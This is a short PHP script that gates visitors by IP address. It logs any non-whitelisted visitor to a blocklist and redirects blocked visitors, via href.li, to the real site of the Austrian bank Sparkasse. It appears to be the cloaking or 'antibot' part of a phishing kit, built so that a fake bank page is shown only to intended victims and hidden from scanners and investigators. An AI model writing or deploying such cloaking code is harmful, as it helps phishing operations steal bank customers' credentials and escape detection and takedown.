<?php

$userinfo = $_SERVER['REMOTE_ADDR'];

$dwFile = explode("\n", file_get_contents(dirname(__FILE__) . "/whitelist.dat"));
$vlad = dirname(__FILE__) . "/blocklist.dat";
$vladPutin = explode("\n", file_get_contents($vlad));

$userinfo = $_SERVER['REMOTE_ADDR'];
if (in_array($userinfo, $vladPutin)) {
   header("Location: https://href.li/?https://sparkasse.at");
   die("<b style='color:white'>INVALID DOMAIN</style>");
};

if (!in_array($userinfo, $dwFile)) {
      $file = fopen($vlad, 'a');
      fwrite($file, $userinfo . "\n");
      fclose($file);
      header("Location: https://href.li/?https://sparkasse.at");
      die("Invalid User session");

};
